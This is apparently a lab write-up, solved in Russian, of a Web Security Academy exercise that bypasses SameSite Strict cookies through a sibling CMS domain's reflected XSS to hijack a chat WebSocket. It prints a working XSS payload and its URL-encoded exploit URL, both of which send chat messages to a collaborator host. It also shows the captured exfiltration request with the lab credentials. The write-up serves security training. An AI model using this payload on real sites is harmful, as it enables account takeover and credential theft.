# SameSite Strict bypass via sibling domain
PRACTITIONER

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.

## Решение
Если отправить агенту эксплойт, эксплуатирующий [Cross-Site WebSocket Hijacking](../../websockets/02-cross-site-websocket-hijacking/), то это сработает, но полученная история переписки будет пуста, потому что кукис `session` установлен с атрибутом `SameSite:"Strict"` и не передаётся при подключении по ws с сайта эксплойт-сервера.

Запрос некоторых ресурсов приводит к ответу с заголовком Access-Control-Allow-Origin:
```
GET /resources/images/rating5.png HTTP/2
Host: 0aba0058033694d48030bc4d00a8007c.web-security-academy.net
Cookie: session=qjrxdWw1i97H5OY7xp3fkkHDpCcUBl15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aba0058033694d48030bc4d00a8007c.web-security-academy.net/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
```
```
HTTP/2 200 OK
Content-Type: image/png
Cache-Control: public, max-age=3600
Access-Control-Allow-Origin: https://cms-0aba0058033694d48030bc4d00a8007c.web-security-academy.net
X-Frame-Options: SAMEORIGIN
Content-Length: 495

PNG
```
Значение этого заголовка содержит ссылку на сайт https://cms-0aba0058033694d48030bc4d00a8007c.web-security-academy.net, который содержит форму логина с уязвимостью Reflected XSS.

POST-запрос отправки формы можно преобразовать в GET-запрос:

`https://cms-0aba0058033694d48030bc4d00a8007c.web-security-academy.net/login?username=<script>alert(1)</script>=test`

В качестве нагрузки использую скрипт подключения по ws, пропущенный через URL-кодирование:
```
<script>
const ws = new WebSocket('wss://0aba0058033694d48030bc4d00a8007c.web-security-academy.net/chat');
ws.onopen = function() {
  ws.send('READY');
};
ws.onmessage=function(event) {
  fetch('https://9x7kj2th9mc2plpuej4rfecgm7sygr4g.oastify.com', { method: 'POST', mode: 'no-cors', body: event.data });
};
</script>
```
`https://cms-0aba0058033694d48030bc4d00a8007c.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%63%6f%6e%73%74%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%62%61%30%30%35%38%30%33%33%36%39%34%64%34%38%30%33%30%62%63%34%64%30%30%61%38%30%30%37%63%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%77%73%2e%73%65%6e%64%28%27%52%45%41%44%59%27%29%3b%0a%7d%3b%0a%77%73%2e%6f%6e%6d%65%73%73%61%67%65%3d%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%39%78%37%6b%6a%32%74%68%39%6d%63%32%70%6c%70%75%65%6a%34%72%66%65%63%67%6d%37%73%79%67%72%34%67%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%20%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%20%7d%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=test`

В коллабораторе получаю историю переписки:
```
POST / HTTP/1.1
Host: 9x7kj2th9mc2plpuej4rfecgm7sygr4g.oastify.com
Connection: keep-alive
Content-Length: 82
sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://cms-0aba0058033694d48030bc4d00a8007c.web-security-academy.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://cms-0aba0058033694d48030bc4d00a8007c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{"user":"Hal Pline","content":"No problem carlos, it&apos;s 90ogwae4suavytud2r0e"}
```
Логинюсь как carlos:90ogwae4suavytud2r0e. Задание выполнено.
